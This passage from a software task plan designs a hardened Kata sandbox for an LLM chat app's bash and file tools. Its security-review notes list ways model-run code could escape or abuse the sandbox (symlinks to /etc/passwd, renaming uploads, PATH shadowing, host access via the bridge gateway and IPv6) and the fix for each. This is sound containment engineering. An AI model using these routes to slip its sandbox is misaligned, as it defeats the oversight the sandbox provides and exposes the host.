   `PYTHONUSERBASE` and does not set `PYTHONNOUSERSITE` (the proposal's
   open item): `pip install --user` into `/workspace/.local` is importable
   in the next `exec`. If not, the fallback is `/workspace/.venv` created
   with `--system-site-packages`; record which.
8. Cold start: time from `docker run` to the first `exec`'s output, and
   host RSS of an idle sandbox (`cloud-hypervisor` plus `virtiofsd`), five
   runs each. Record with the hardware and versions.
9. With `/workspace` owned by 1000 and a root-owned `0555`
   `/workspace/uploads` holding `0444` files: can UID 1000 rename the
   directory (`mv /workspace/uploads /workspace/x`) and put its own in
   its place? It probably can. If so, T13 re-checks the directory's owner
   and mode before every sync and re-creates it, and the acceptance test
   "Read-only uploads" adds the rename case.
10. `exec` with data on stdin *and* streamed, demultiplexed output in one
    call, through the Docker SDK's low-level API (`write_file` needs it).
    If they do not combine, record the alternative used (for example
    `put_archive` into a staging path then a `mv` as UID 1000).
11. `docker compose down` while a sandbox container is attached to the
    Compose-defined `local-llm_sandbox` network: does removing the network
    fail? If it does, T16 creates the network outside Compose (the
    manager creates it, `internal: true`, and Compose refers to it as
    `external`), or `make backend`'s exit stops sandboxes first; record
    the choice.

**Verify:** the ledger row has an answer and evidence for all eleven.

### T10: sandbox core **security**

*Author: any. Verify: any. Depends: T00.*

Revised 2026-11-10 after T10's security review (and owner answers Q10,
Q11); the list below is what was built. The first version had the
backend take any argv and a caller-chosen `volume`, let `put_files`
grant write bits and adopt files already in the directory, and counted
every 124 as a timeout.

Create the package `apps/server/local_llm/sandbox/`:

- `__init__.py`: exports only what other modules use (not `FakeBackend`
  or the limits).
- `types.py`:
  - `ImageKey = Literal['data', 'web']`; `validate_chat_id()` (a
    canonical UUID, the manager's key per Q5) and `volume_name()`
    (`lllm-sandbox-<id>`).
  - `SandboxSpec` (frozen dataclass): `chat_id`, `image`, `labels`,
    `ephemeral` (Q5), with `volume` derived, never given; it refuses a
    non-UUID id, an image outside `ImageKey` and label keys starting
    `lllm.` (the backend sets `lllm.chat`, `lllm.image` and
    `lllm.ephemeral` itself). Built only by the manager (T11), so no
    caller string reaches Docker options.
  - `ExecResult` (pydantic, frozen): `returncode`, `stdout`, `stderr`,
    `timed_out`, `truncated`, `duration_ms`.
  - `FileEntry`, `FileStat` (`kind`, `uid`, `mode`, `size`, `mtime`),
    `SandboxInfo` (`chat_id`, `running`, `image`, `ephemeral`,
    `last_used`, `ip`; `last_used` is when the container last started,
    or the volume was created, since labels cannot change afterwards),
    and the errors `SandboxError`, `SandboxNotRunning`,
    `SandboxUnavailable`.
- `backend.py`: `class SandboxBackend(Protocol)`, async, every method
  refusing a non-UUID chat id:
  - `create(chat_id, spec)`: idempotent; the volume is a fixed-size
    `WORKSPACE_SIZE` filesystem (Q11).
  - `exec(chat_id, argv, timeout_s, stdin=None) -> ExecResult`: argv
    passes `require_wrapped()`, which refuses a `timeout_s` outside
    1..300, so callers clamp once (`clamp_timeout()`) and pass the same
    value to the wrapper and to `exec`. Every ending the command causes (exit
    status, signal, OOM, `timeout`, the host deadline) is an
    `ExecResult`; `SandboxError` means only that the sandbox failed,
    including a sandbox found dead after the command.
    After every exec the backend kills every UID 1000 process (Q10).
  - `put_files(chat_id, dir, files)`: `dir` is one component under
    `/workspace`; afterwards it is root-owned `0555` and holds exactly
    the given files, root-owned, with modes inside `0o555`, an entry of
    the wrong type replaced, never followed.
  - `get_files(chat_id, paths, max_bytes)`: normalised paths under
    `/workspace/`; regular files only; others and oversized ones are
    omitted, never truncated.
  - `stat(chat_id, path) -> FileStat | None`: a daemon-side stat the
    model cannot forge (T13, T17).
  - `stop`, `destroy`, `list_sandboxes() -> list[SandboxInfo]`, `ready()`.
  - shared validators, so the two backends cannot drift:
    `validate_create()`, `validate_put_files()`, `validate_get_files()`
    and `validate_sandbox_path()`.
- `limits.py`: the fixed limits as constants, deliberately not settings:
  memory `4g`, CPUs `2` (`NANO_CPUS`), PIDs `512` (not enforced by Kata,
  kept), `nproc` `512` (Q8), `/tmp` `256m`, workspace `10g` (Q11), user
  `1000:1000`, stream cap `20_000` characters, timeout default 60 and
  maximum 300 seconds, kill grace 5 seconds, host deadline slack 10
  seconds, command at most 100,000 bytes, output file cap 50 MiB, and
  the fixed container options (`CAP_DROP`, `SECURITY_OPT`,
  `READ_ONLY_ROOT`, `WORKSPACE`).
- `exec.py`: `wrap_argv(argv, timeout_s)` returns
  `['/usr/bin/timeout', '--kill-after=5', str(t), *argv]` with `t`
  clamped to 1..300 (an int only); `wrap_command(command, timeout_s)` is
  `wrap_argv(['/bin/bash', '-lc', '--', command], ...)`, refusing a NUL
  byte or more than 100,000 bytes; `require_wrapped()`; `class
  StreamCap`, a bounded collector keeping the first and last 10,000
  characters as bytes arrive (incremental UTF-8, 64 KiB decode slices)
  and rendering `<head>\n[... N characters truncated ...]\n<tail>`; and
  `result_from(returncode, *, stdout, stderr, elapsed_s, timeout_s,
  deadline_hit=False)`, where `timed_out` is the host deadline, or 124
  once `elapsed_s` reached the timeout, or 137 once it reached the timeout
  plus the kill grace. An early 124 (the model's own `timeout`) or an
  early 137 (an OOM kill, T02) is not a timeout.
- `fake.py`: `FakeBackend`, an in-memory implementation for tests that
  enforces the same contracts: per-chat files with owner and mode, a
  guest root (`/etc/passwd` readable, `/etc` read-only, `/tmp`
  writable and emptied at each start), the search bit on ancestors, no
  root override (capabilities are dropped), a scripted `exec` (an async
  callable the test supplies, defaulting to a tiny interpreter for `cat`,
  `ls`, `printf`, `sleep` that honours the timeout), and recorded calls,
  including the kill after every exec, so tests can assert what the
  manager asked for.

**Tests** (`apps/server/tests/test_sandbox_core.py`): `wrap_command`
passes the command as one untouched argv element and clamps the
timeout; `StreamCap` on 10 MB keeps exactly the head and tail, sets
`truncated`, and stays bounded in memory (fed in chunks); the 124 and
137 rules, both ways; every validation above; `FakeBackend` keeps files
across `stop()` and loses them on `destroy()`, and enforces the
read-only uploads, the guest root and the permission model.

**Verify:** `make test-backend` (or, without Docker, `cd apps/server &&
uv run --frozen python -m pytest tests/test_sandbox_core.py -q`);
`make test-types`.

### T11: `SandboxManager` lifecycle

*Author: any. Verify: any. Depends: T10.*

`apps/server/local_llm/sandbox/manager.py`. It is the only module that
talks to the backend. Its instance lives on `app.state.sandbox`, created
in `main.py`'s `lifespan` and closed in `_shutdown`, but that wiring is
T14's (changed 2026-11-10): until T14 there is no real backend to give
it, and wiring the `FakeBackend` into the app would be placeholder work.
T11 provides everything the wiring calls (the maintenance loop, the
startup sweep, `shutdown()`), tested against `FakeBackend`.

- **Per-sandbox lock:** one lock per backend key (a saved chat, or an
  unsaved chat and user, Q12), dropped when nobody holds or waits on it;
  every operation on a sandbox holds its lock, so concurrent tool calls
  never interleave.
- **Concurrency cap:** at most `max_running` sandboxes tracked as
  running (a count, not a fixed `Semaphore`, since the limit is re-read
  from the settings), a slot taken on create and freed only on a
  confirmed stop or destroy, so a fifth chat waits until one stops. The wait is visible: the tool call
  emits a status event ("waiting for a free sandbox") through the event
  emitter after one second. Per Q13, a waiting chat first evicts the
  least-recently-used sandbox that is not in use and has been idle at
  least 60 seconds (its files stay on its volume); with none to evict it
  waits at most 2 minutes, then fails with "no free sandbox".
- **Lazy create:** the first call for a chat resolves its sandbox key:
  - a **saved chat** (a row exists, and the caller is its owner or an
    admin exactly as the chat completion endpoint allows, Q14; not every
    reader of the chat): the key is the chat id, and the sandbox is
    persistent (volume kept, retention applies);
  - an **unsaved chat** (an id starting with one of
    `NON_SAVED_CHAT_ID_PREFIXES` in `utils/chat_id.py`, including the
    harness's `temporary:benchmark-<uuid>`; use that tuple, not a copy of
    the prefixes): per Q5, an
    **ephemeral** sandbox, keyed by a UUID the manager generates and maps
    in memory from the chat id **and the user** (Q12), so members of a
    shared `channel:` chat each get their own; its volume is destroyed
    whenever its container stops;
  - anything else is refused before the backend is called.

  Then `backend.create`. The backend only ever sees the UUID key, never
  the raw chat id.
- **Image switch:** a call naming a different image than the running one
  stops the container and creates the other on the same volume.
- **Idle reaper:** a background task every 60 s stops sandboxes idle for
  `idle_minutes` (default 30).
- **Retention sweep:** the same task, hourly, destroys persistent volumes
  unused for `retention_days` (default 7) **and every persistent volume
  whose chat no longer exists** (Corrections, item 6). Ephemeral sandboxes
  (label `lllm.ephemeral=1`) are never judged by "chat exists"; they go
  when stopped, and the startup sweep destroys any left over. T24 (Q15)
  later changes the expiry case: an expired volume is marked pending and
  kept until its user answers a dialog, while a deleted chat's volume
  still goes silently.
- **Harness items:** an API to destroy a chat's sandbox now
  (`manager.release(chat_id)`), which the harness calls when an item
  finishes (T30), so ephemeral harness sandboxes never idle in a slot.
- **Last use** (chosen 2026-11-10): the idle reaper uses an in-memory
  record of each running sandbox's last call (every running sandbox
  started under this manager, since the startup sweep stops the rest);
  the retention sweep uses the chat row's `updated_at`, since every call
  happens inside a chat that is being updated, it survives restarts and
  it needs no new table. Ephemeral sandboxes need neither.
- **Orphan sweep at startup:** list sandboxes by label
  `lllm.chat`; stop every running one (they lost their manager), keep
  their volumes for the retention rule.
- **Shutdown:** leave running sandboxes alone on an ordinary shutdown,
  since a `--reload` restart would otherwise kill them mid-command; the
  startup sweep handles them. When `LLLM_STOP_JOBS_ON_SHUTDOWN=true`, stop them
  (`routers/benchmarks/__init__.py`'s `shutdown()` is the pattern), and
  print a `==> ` line only if the desktop progress dialog is updated in
  the same commit (AGENTS.md, Desktop).
- **Settings** come from config (T19) through one `Config.get_many` per
  operation, not cached forever, so an admin change takes effect on the
  next call.

**Tests** (`tests/test_sandbox_manager.py`, with `FakeBackend`): two
concurrent calls on one chat run one after the other; the fifth chat
waits and proceeds when one stops; the reaper stops an idle sandbox and
keeps its volume; the sweep destroys an expired volume and an orphaned
one (chat deleted) and keeps a live one; an image switch keeps files;
startup sweep stops leftovers; an unknown chat id, or a saved chat the caller does not own and cannot reach as an admin (Q14), is
refused before the backend is called; a `temporary:` id gets an
ephemeral sandbox that the sweep leaves alone while running and that
`release()` destroys with its volume.

**Verify:** the tests above; `make test-backend`; `make test-types`.

**From T10's code review (2026-11-10):** build `SandboxInfo` with
keywords. `SandboxInfo.last_used` is when the backend last started the
container (or created the volume): Docker labels cannot change after
creation, so no backend reports per-call use, and once a sandbox is
stopped only the volume's creation time remains. The 7-day retention
sweep therefore keeps its own last-used record (a manager-side table or
file updated on every call), not `last_used`. (Superseded the same day by
T11's "Last use" choice, the chat row's `updated_at`; T24 adds the
manager's own table.) A volume's `ephemeral`
flag is fixed when the volume is created; `list_sandboxes()` reports it
whether or not the container runs, and `image` only while it runs.

### T12: the four tools and path confinement **security**

*Author: any. Verify: any. Depends: T11.*

In `tools/builtin.py`, a new section beside "CODE INTERPRETER TOOLS"
(`builtin.py:640`), four async functions with the dunder parameters the
existing tools take (`__request__`, `__user__`, `__event_emitter__`,
`__chat_id__`, `__message_id__`, `__metadata__`). Their docstrings become
the tool specs (`utils/tools.py:1066-1083`), so write them for the model:

| Tool | Arguments | Behaviour |
|---|---|---|
| `bash` | `command: str`, `timeout_s: int = 60`, `image: str | None = None` | Runs `wrap_command` in the chat's sandbox, working directory `/workspace`. Returns JSON `{returncode, stdout, stderr, timed_out, truncated, outputs}` where `outputs` lists files attached this call (T17). `image` must be `data` or `web`; anything else is an error naming the two, and the description lists each image's contents |
| `view` | `path: str`, `start_line: int | None`, `end_line: int | None` | A file: numbered lines (cap the same as a stream). A directory: a listing two levels deep, hidden files excluded except `.runs`. An image: returned as a `data:image/...` result so the existing tool-image path (`utils/middleware.py:1112-1114`) shows it to a vision model |
| `write_file` | `path: str`, `content: str`, `overwrite: bool = False` | Writes as UID 1000 via `exec` with the content on stdin; refuses an existing file unless `overwrite`; returns bytes written |
| `str_replace` | `path: str`, `old_str: str`, `new_str: str` | Exactly one match required; zero or several is an error saying how many; returns a few lines of context around the edit |

**Path confinement.** Every path is resolved *inside the sandbox*, since
only the guest sees its own symlinks: a small helper script baked into
the image (`/usr/local/bin/lllm-path`, T15), run as UID 1000, does
`realpath -m` and refuses anything outside `/workspace`. The backend side
also rejects, before any exec, absolute paths outside `/workspace`, `..`
segments that leave it, NUL bytes and paths over 4,096 bytes. With the
`FakeBackend`, the helper is emulated. The script itself has one source,
`infra/sandbox/common/lllm-path`, written here and copied into the images
by T15; a test runs the real script with bash against a temporary
directory through the same cases as the emulation, so the two cannot
drift. The tools find the manager at `request.app.state.sandbox` (set by
T14's lifespan wiring); when it is missing, they return a tool error
saying the sandbox is not available, never an `AttributeError`.

**Registration.** Import the four in `utils/tools.py` (beside
`execute_code`, about line 63). `_gated_tools` (`utils/tools.py:629-651`)
gates on a config key, capability, feature and permission, but cannot
choose by engine, so replace the code interpreter's entry in
`_BUILTIN_TOOL_SELECTORS` (`:794-801`) with a small custom selector that
applies the same four gates and then returns `[execute_code]` when the
engine is `jupyter` or `pyodide` and `[bash, view, write_file,
str_replace]` when it is `sandbox` (the tag path, T20, is separate). Add
`code_interpreter.engine` to the `Config.get_many` batch in
`get_builtin_tools` (`:844-856`); that changes the golden
`tests/fixtures/tool_loading.json` (an expected gate finding).

**Tests** (`tests/test_sandbox_tools.py`): each tool's happy path and
errors through `FakeBackend`; confinement refuses `../etc/passwd`,
`/etc/passwd`, a symlink pointing out (emulated) and a NUL; `str_replace`
with zero and two matches; `write_file` refuses overwrite by default;
tool specs are generated and named uniquely; the tools are offered only on
the sandbox engine and `execute_code` is not.

**Verify:** the tests; `make test-backend`; `make test-types`; a
security review of the confinement and the argv construction.

**From T10's security review (2026-11-10):** commands the manager runs
for its own checks (`lllm-path` and the like) must not trust the guest's
environment: absolute paths, `bash --noprofile --norc`, a fixed `PATH`,
since `/workspace/.local/bin` and any model-written file could shadow a
command. The `FakeBackend` now models `/etc/passwd` (root-owned, readable)
and a writable `/tmp`, so a "refuses `/etc/passwd`" test fails for the
right reason; it does not model symlinks or `chmod`, `mv`, `rm` and `ln`,
which this task's confinement tests need: extend the fake here, with the
guest's semantics, rather than testing against "command not found".

### T13: chat uploads **security**

*Author: any. Verify: any; docker, kvm. Depends: T11.*

Move `chat_files()` and its caps (`MAX_FILE_BYTES` 50 MiB,
`MAX_TOTAL_BYTES` 200 MiB) from `utils/code_interpreter.py:20-72` into
`sandbox/uploads.py` unchanged in behaviour (owner or `has_access_to_file`
read, basenames, `name (n).ext` de-duplication, notes for skipped files).
Leave a re-export in `utils/code_interpreter.py` until T40 deletes the
file, so the Jupyter path keeps working.

Before each `bash` call, the manager syncs the chat's attached files
(`metadata['files']`) into `/workspace/uploads`: files already copied
(same file id and size, tracked by the manager per chat) are skipped; new
ones are written with `put_files` as root, mode `0444`, in a directory
created root-owned with mode `0555`. Notes for skipped files go into the
tool result's `stderr`, as the Jupyter path does today.

**Tests** (`tests/test_sandbox_uploads.py`, ported from
`test_jupyter_chat_files.py`'s `chat_files` cases so coverage moves with
the code): access checks, caps, de-duplication; sync copies once; the
fake enforces read-only to UID 1000.

**Verify:** the tests (any). On the laptop (docker, kvm): with T14 and
T15 done, writing, deleting and `chmod` on an upload fail inside a real
sandbox. Record it; it is acceptance test "Read-only uploads".

**From T02 (2026-11-10):** UID 1000 can rename the root-owned
`/workspace/uploads` aside and create its own in its place (item 9), so
before every sync check the directory's owner (0) and mode (`0555`) and
re-create it when they differ; the acceptance test "Read-only uploads"
gains the rename case. The moved-aside copy cannot be removed by either
side alone: a root exec (capabilities dropped) can `chmod u+w` and empty
it, but only UID 1000 can `rmdir` it from the 1000-owned `/workspace`.
`put_archive` keeps the tar headers' mtime, so set it (zero shows as 1970).

**From T12's code review (2026-11-11):** a cancelled session call waits
at most `limits.CANCEL_WAIT_S` (30 s), and `put_files` is included, so a
Stop during a large upload sync can cost a sandbox restart; keep each
sync's `put_files` small enough to finish well inside that bound.

**From T13's security review (2026-11-11), a change of mechanism:** with
`put_files` into the volume, a model that loops `mv uploads uN` forces a
full re-put each time and leaves a root-owned copy UID 1000 cannot delete,
until the 10 GiB workspace is full; and a failed sync refused the command,
so a full workspace locked `bash` out. So uploads become a read-only bind
mount at `/workspace/uploads` of a per-key host directory
(`DATA_DIR/sandbox/uploads/<uuid>`, path from the validated UUID only),
which the guest cannot write, rename or remove, filled through a backend
method `put_uploads` that makes the directory hold exactly the chat's
files and waits for the guest's view; the proposal's summary already
called it "a read-only uploads mount". This replaces the `put_files` and
rename-aside handling above, subject to a Kata spike (T14); if the spike
fails, `put_files` stays with a bounded reclaim of moved-aside copies. A
sync failure never refuses the command: it is a note in stderr.

**From T10's security review (2026-11-10):** `put_files`
leaves `/workspace/<dir>` containing exactly the given files, replacing
(never following) an entry of that name that is a symlink, a file or a
directory not owned by root, which closes the rename case from T02 item 9
and removes files the model planted; re-check the owner and mode with the
backend's daemon-side `stat()`, never with an exec, whose output the model
controls. File modes may not carry write bits (`mode & ~0o555`).

### T14: `KataDockerBackend` **security**

*Author: any. Verify: docker, kvm. Depends: T10, T02.*

- Add the Docker SDK: from `apps/server/`, `uv add docker` (runtime
  dependency; not a gate change). Record the version in the decisions
  entry.
- `sandbox/kata.py`, `class KataDockerBackend`, every SDK call wrapped
  in `asyncio.to_thread`. `create` runs, with fixed options only:
  ```text
  image=<resolved from the image key>, runtime='kata-clh',
  name='lllm-sandbox-<chat id>', labels={'lllm.chat': <chat id>, 'lllm.image': <key>},
  user='65534:65534' (Q16; every exec passes user='1000:1000'), init=True,
  cap_drop=['ALL'], security_opt=['no-new-privileges'],
  read_only=True, tmpfs={'/tmp': 'size=256m'}, mem_limit='4g', nano_cpus=2e9,
  pids_limit=512, ulimits=[Ulimit(name='nproc', soft=512, hard=512)],
  network='local-llm_sandbox', extra_hosts={'sandbox-mirror': SANDBOX_MIRROR_ADDRESS},
  volumes={'lllm-sandbox-<chat id>': {'bind': '/workspace', 'mode': 'rw'}},
  mounts=[Mount(target='/workspace/uploads', source='<DATA_DIR>/sandbox/uploads/<chat id>',
                type='bind', read_only=True)],
  sysctls={'net.ipv6.conf.all.disable_ipv6': '1', 'net.ipv6.conf.default.disable_ipv6': '1'},
  working_dir='/workspace', detach=True, auto_remove=False,
  entrypoint=['/usr/bin/sleep', 'infinity'] (under Docker's tini, as `nobody`; see Q16),
  healthcheck={'test': ['NONE']}
  ```
  (Amended by T14, 2026-11-11: the images' own `ENTRYPOINT ["tini", "-g",
  "--"]` is replaced, so `init=True` does not stack two inits; the data
  image's inherited Jupyter health check is turned off; uploads are a
  read-only bind of a per-key host directory, filled by the new
  `put_uploads`, after T13's security review found that UID 1000 could
  rename a `put_files` upload directory aside without end and fill the
  workspace with copies it could not delete. Checked on Kata, guest
  seccomp on: write, chmod, unlink and create fail with EROFS, renaming
  or removing the directory with EBUSY, root without capabilities cannot
  remount it, and a host-side atomic replace shows in the guest at once.
  From T13's security re-review: stale uploads are removed before new
  ones are written, `stop` empties the host directory, Kata's host-side
  share of it is itself a read-only bind, and `create` removes a
  non-directory `uploads` entry left in a workspace from before the mount,
  which otherwise moved the mount where a symlink pointed.)
  `ulimits` is the process limit that Kata 4.3.1 enforces; it does not
  enforce `pids_limit`, which stays in case a later release does (Q8).
  `extra_hosts` is how the guest finds the mirror: Docker's embedded DNS
  does not answer inside a Kata VM (Q9), so `SANDBOX_MIRROR_ADDRESS` is a
  constant in `sandbox/kata.py` that matches the address T16 fixes in
  Compose, with a test that reads the Compose file and checks they agree.
  The key is the manager's UUID (T11), validated as a UUID again here
  before it is put in a name, a label or a volume name.
  `exec` uses the low-level API (`exec_create` + `exec_start(stream=True,
  demux=True)`) feeding two `StreamCap`s, then `exec_inspect` for the
  return code; a host-side deadline of `timeout_s + 10` kills the exec if
  `timeout` itself hangs. `put_files` builds a tar in memory with uid 0
  and the given modes. `get_files` uses `get_archive` and stops reading at
  `max_bytes`. `ready()` checks: the daemon answers, `kata-clh` is in
  `docker info`'s runtimes, both images exist, the `sandbox-mirror`
  container is running.
- Image references: `local-llm/sandbox-data:<tag>` and
  `local-llm/sandbox-web:<tag>`, the tags in one constant updated by T15;
  the backend records each image's digest (`image.id`) for telemetry and
  the harness.

**Tests** (`tests/test_sandbox_kata.py`): skipped unless
`LLLM_TEST_KATA=1` (Q3), with a module docstring saying how to run them.
They cover the proposal's acceptance tests that need a real sandbox and
have a crisp pass/fail: VM boundary (`uname -r` differs), network fence,
cross-chat isolation, persistence across `stop`, read-only uploads,
timeout leaves no process (`ps` inside), fork bomb contained, memory
OOM inside, output flood capped, restart sweep, and path confinement
against a real symlink (`ln -s /etc /workspace/e`, then `view e/passwd`
must be refused by `lllm-path`). Plus unit tests (no Docker, always run)
against a mocked SDK client, one per method, so CI covers the backend
(Ground rules, diff coverage): `create` passes every option above and
nothing from the caller except the validated image key and UUID; `exec`
feeds both caps, maps return codes and enforces the host-side deadline;
`put_files` builds the tar with uid 0 and the modes; `get_files` stops at
`max_bytes`; `ready()` reports each failure reason; `list_sandboxes`,
`stop` and `destroy` call the right SDK methods.

**Verify (docker, kvm):** `cd apps/server && LLLM_TEST_KATA=1 uv run
--frozen python -m pytest tests/test_sandbox_kata.py -v`, output in the
ledger with the date and commit; the always-on unit test in `make
test-backend`; a security review.

**From T02 (2026-11-10):** `pids_limit` is not enforced and `ulimits`
nproc is (Q8); container names do not resolve in the guest, hence
`extra_hosts` (Q9). When `timeout` fires, backgrounded children survive
it (a fork bomb's 15,852 processes stayed), and a root exec cannot kill
them because `cap_drop` removes `CAP_KILL`; ending a timed-out command
must therefore kill UID 1000's processes (for example an exec as
`1000:1000` running `kill -9 -1`), not only `timeout`'s child, and the
acceptance test "Timeout" should include a backgrounded child. For
`write_file`, `exec_start(socket=True)`, writing stdin, then
`shutdown(SHUT_WR)` and reading the 8-byte-header frames works in one call
(item 10); close the SDK response object, not only the raw socket, or
urllib3 logs an error on close. Measured cold start to the first exec's
output is about 1.0 s and idle host memory about 390 MiB per sandbox
(item 8); after an OOM kill, `cloud-hypervisor` keeps the guest's memory
(4.2 GB RSS), so a busy sandbox holds up to its limit until it stops.

**From T10's security review (2026-11-10):** `exec` calls
`require_wrapped()` first and gets its argv from `wrap_command()` or
`wrap_argv()` (absolute `/usr/bin/timeout` and `/bin/bash`, and `--`
before the command). Every ending the command causes comes back as an
`ExecResult`; `SandboxError` means the sandbox failed (after a 137,
check the container still runs, to tell an OOM from a dead VM). Measure
`elapsed_s` from the exec's start to its exit in `exec_inspect`, and pass
`deadline_hit=True` when the host deadline (`timeout_s +
HOST_DEADLINE_SLACK_S`) ended it. After **every** exec, kill every UID
1000 process (`kill -9 -1` as `1000:1000`; Q10). The volume is a
fixed-size `WORKSPACE_SIZE` filesystem (Q11): prove a loop-backed ext4
volume under `kata-clh` (mount, persistence, `ENOSPC` at the size, the
host unaffected) before relying on it. `get_files` checks the daemon's
path stat before reading a body and returns regular files only.
`put_files` must replace, not merge: Docker's untar (moby/go-archive
`Unpack`) removes an existing path unless both it and the tar entry are
directories, in which case it merges, so a tar whose first entry is the
directory keeps old and planted children. One way: a regular-file entry
of that name first (which removes whatever is there), then the directory
entry, then the files. `nano_cpus` is `limits.NANO_CPUS`, an int.
`exec_inspect` reports no exit time, so the backend times `elapsed_s`
itself (for example by polling until the exec stops running).

**From T11 (2026-11-10):** the manager lets a `create`, `stop` or
`destroy` finish even when the session that started it is cancelled (a
cancelled `to_thread` call keeps running, and the manager must know
whether a container exists), so a hung Docker daemon would hang a
session's cancellation and the lifespan's shutdown too: give each of
those backend calls its own timeout, raising `SandboxError`.

**The keep-alive and Q10's kill (checked on Kata, 2026-11-10):** with
`--init` (tini) and `user='1000:1000'`, `kill -9 -1` as UID 1000 kills
the keep-alive `sleep`, tini exits and the container stops (exit 137).
Without `--init`, `sleep infinity` is PID 1, survives (signals to PID 1
from inside its namespace are ignored without a handler) and the next
exec works, but the killed processes stay as zombies (two after one
call), since `sleep` reaps nothing, and zombies count against the
512-process `nproc` limit, so after a few hundred calls the sandbox
could no longer fork. So PID 1 must survive the kill *and* reap: for
example tini as PID 1 running as a different UID from the execs (the
execs pass `user='1000:1000'` themselves), or a PID 1 that reaps orphans
and never exits. Prove the choice with a test that runs several hundred
calls, each leaving a background child, and checks the process count
stays flat; if it changes the proposal's `--user 1000:1000` for PID 1,
ask the owner.

**Checked on Kata, 2026-11-11 (alpine, `kata-clh`):** with `init=True` and
`user='65534:65534'` for the container (PID 1 `docker-init` and its
`sleep` run as `nobody`), and every exec passing `user='1000:1000'`, 150
calls that each left two background `sleep 300` children, each followed by
`kill -9 -1` as UID 1000, left the container running with 7 processes and
0 zombies (9.9 s for the 300 execs); UID 1000 cannot signal `nobody`'s
processes, and tini reaps the orphans. Re-prove it on the real image
(scipy-notebook's entrypoint is already tini, so `init=True` may stack two
inits). **A background child holds the exec's stream open:** the first
run, whose background children inherited the exec's stdout, did not
return until the children exited (300 s each). So `exec` must not wait
for the stream's EOF: watch the main process with `exec_inspect` (check on
Kata that it reports `Running: false` while a child still holds the
stream), then run Q10's kill, which closes the pipes, then drain;
`elapsed_s` runs to that exit, and the case is not a `deadline_hit` (or
every `cmd &` would be reported as a timeout). The acceptance test
"Timeout" and the mocked-SDK unit tests both cover it.

**Lifespan wiring (moved here from T11, 2026-11-10):** create the
`SandboxManager` with this backend on `app.state.sandbox` in `main.py`'s
`lifespan` (near the other `app.state` tasks), run its startup sweep and
start its maintenance loop there, and in `_shutdown` call its
`shutdown()` (stopping running sandboxes only under
`LLLM_STOP_JOBS_ON_SHUTDOWN`) and cancel the loop. When `ready()` reports
a reason (no Kata on the host), the app still starts and the manager
refuses calls with that reason.

**From T12's security review (2026-11-11):** the file tools resolve a
path in one exec and use it in the next call, so `exec`'s contract
(`backend.py`) now requires: the post-exec kill waits until no UID 1000
process remains (check the `Uid:` lines in `/proc`: T14 found `kill -0
-1` succeeds whenever any process is visible) and fails closed, stopping the sandbox
and raising `SandboxNotRunning` with fixed text, when it cannot confirm
that (a fork bomb at the `nproc` limit stops the kill exec itself); a
cancelled `exec` runs the kill at once and neither returns nor raises
until it has completed (a cancelled `to_thread` call runs on, so catch the
cancellation, kill, wait for the thread, then re-raise). The manager waits
at most `limits.CANCEL_WAIT_S` (30 s) for a cancelled call; past that it
marks the session died and stops the sandbox under its lock, so `stop`
must work while an abandoned exec thread is still running.
After that bound the manager also gives up on a cancelled `put_files` or
`get_files` that is still running; `stop` must make sure such a root-side
call cannot land in the restarted sandbox (for example by waiting for it,
or by stopping the container so the archive call fails). `stat` maps a
FIFO, a socket or a device to `kind='other'`, never `'file'`. Refuse to
start the manager with more than one uvicorn worker, since the per-chat
lock is per process (N7). Wrap every Docker SDK error in a `SandboxError`
with fixed wording free of host paths and the daemon URL (S4); the tools
pass on only `SandboxError.public`. The acceptance tests "Fork bomb
contained" and "Timeout" also check that the next call sees no leftover
UID 1000 process.

**Found while building T14 (2026-11-11, `kata-clh`, data image
`2026-11-11.1`):**

- **`exec_inspect` stays `Running: true` while a background child holds
  the exec's stdout** (8 s observed with `sleep 30 & echo started`; the
  exit status appears only once the stream closes), so the main process's
  end cannot be read from the daemon. The backend starts, after 0.25 s, a
  watcher exec as `nobody` (UID 1000 cannot kill it) that polls `/proc`
  until the UID 1000 process with `PPid: 0` (an exec's own process) is
  gone, then runs the kill, which closes the stream; the daemon then
  reports the true exit status. `sleep 300 & echo hi` returns in about
  0.4 s.
- **`kill -0 -1` cannot confirm that no UID 1000 process is left:**
  kill(2) with -1 counts every visible process, even one it may not
  signal, and returns success, so with PID 1's `nobody` processes present
  it always succeeds. The kill script repeats `kill -9 -1` and reads the
  `Uid:` line of every `/proc/*/status` (zombies included) until none is
  1000, up to 5 s; the backend allows it 15 s, then fails closed.
- **PID 1 (Q16) re-proved on the data image:** `init=True`, user
  `65534:65534`, entrypoint `/usr/bin/sleep infinity`: `ps` shows
  `/sbin/docker-init -- /usr/bin/sleep infinity` and `sleep`, both
  `nobody`; 300 calls each leaving background `sleep 300` children (half
  holding the stream) left the process count at its baseline, 0 zombies,
  0 UID 1000 processes, the container running.
- **virtio-fs caches names and attributes for a second** (Kata's
  `virtio_fs_cache = "auto"`): straight after `put_files` replaced
  `uploads`, the guest saw the old directory's attributes and "Stale file
  handle". `put_files` now waits (up to 5 s) until the guest's `stat`
  shows the new root-owned 0555 directory; the daemon's stat remains the
  check of what was written.
- **The fixed-size volume (Q11, Q18):** Docker's local driver cannot use
  `o=loop` ("loop: invalid argument"); the image is attached with
  `udisksctl loop-setup` and mounted from `/dev/disk/by-uuid/<key>`, the
  filesystem's UUID being the key (`docs/guides/sandbox.md`, "Backend").
- **Fork bomb:** peaked at 512 UID 1000 processes; the kill still started
  and confirmed, so the call returned a result (the fail-closed path is
  covered by the unit tests).
- The docker SDK gzips archive bodies unless asked not to; the backend
  sends `Accept-Encoding: identity` for `get_archive` reads.
- **The polkit rule (Q18 b) is installed** on the laptop (2026-11-11,
  `/etc/polkit-1/rules.d/50-local-llm-sandbox.rules`, `loop-setup` for
  `epittman` only; text in `docs/guides/sandbox.md`, "Host setup"). What
  it grants was checked by evaluating the rule under node against stub
  objects. Its effect cannot be shown while a desktop session is active:
  polkit maps a process outside any session to the user's active seat0
  session, which the default `allow_active=yes` already admits, and the
  laptop runs no `sshd`. It is to be proved on the home server, with
  nobody logged in.
- **An internal Docker network does not fence off the host.** The
  host's side of the bridge keeps its own IPv4 address (the gateway), and
  a guest reaches every host service listening on `0.0.0.0` through it;
  T02's fence check had tried only the host's LAN address, `docker0` and
  a public address. The fix is the bridge option
  `com.docker.network.bridge.inhibit_ipv4=true` (no address on the
  bridge; the mirror, a peer, stays reachable), which the backend requires
  of the network before it creates anything (`kata.network_is_fenced`).
  IPv6 was a second way through (T16's security review, B1): the bridge's
  link-local `fe80::` address reached host listeners on `::`. Every guest
  now has IPv6 off (`sysctls` `net.ipv6.conf.{all,default}.disable_ipv6=1`
